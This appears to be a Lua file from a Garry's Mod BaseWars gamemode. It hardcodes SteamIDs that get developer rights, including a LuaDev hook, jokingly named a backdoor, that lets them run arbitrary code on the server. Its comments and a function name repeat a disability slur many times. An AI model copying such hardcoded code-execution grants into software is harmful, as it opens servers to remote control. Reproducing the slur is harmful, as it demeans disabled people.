BaseWars.DevButOnDev = {
	["76561198141518562"] = true,
}

function BaseWars.IsDev(what)

	local info = GetPlayerInfo(what)
	if not info then return false end

	local ply = info:GetPlayer()

	local force = ply.FORCE_DEV_VERY_DANGEROUS
	if force ~= nil then return force end

	if game.IsDev() and BaseWars.DevButOnDev[info:SteamID64()] then return true end

	return info:SteamID64() == "76561198040821426" or ply == NULL
end

BaseWars.EclipseIDs = {
	["76561198386657099"] = true,
	["76561198101997214"] = true
}

-- LETS GET RETARDED IN HERE LETS GET RETARDED IN HERE LETS GET RETARDED IN HERE LETS GET RETARDED IN HERE
-- LETS GET RETARDED IN HERE LETS GET RETARDED IN HERE LETS GET RETARDED IN HERE
-- LETS GET RETARDED IN HERE LETS GET RETARDED IN HERE
-- LETS GET RETARDED IN HERE
-- LETS GET RETARDED IN HERE LETS GET RETARDED IN HERE
-- LETS GET RETARDED IN HERE LETS GET RETARDED IN HERE LETS GET RETARDED IN HERE
-- LETS GET RETARDED IN HERE LETS GET RETARDED IN HERE LETS GET RETARDED IN HERE LETS GET RETARDED IN HERE

function BaseWars.IsRetarded(what)
	local info = GetPlayerInfo(what)
	if not info then return false end

	return BaseWars.IsDev(what) or BaseWars.EclipseIDs[info:SteamID64()]
end

hook.Add("CanLuaDev", "GetBackdooredIdot", function(ply)
	if BaseWars.IsDev(ply) then
		ply:ChatPrint("Allowing LuaDev due to dev perms")
		return true
	end
end)

local function I_HATE_ONEWAYS() -- :antichrist:
	list.Set("RenderFX", "#renderfx.hologram", nil)
	list.Set("RenderModes", "#rendermode.glow", nil)
	list.Set("RenderModes", "#rendermode.worldglow", nil)
end

I_HATE_ONEWAYS()

timer.Create("I_HATE_ONEWAYS", 2, 50, function()
	I_HATE_ONEWAYS()
end)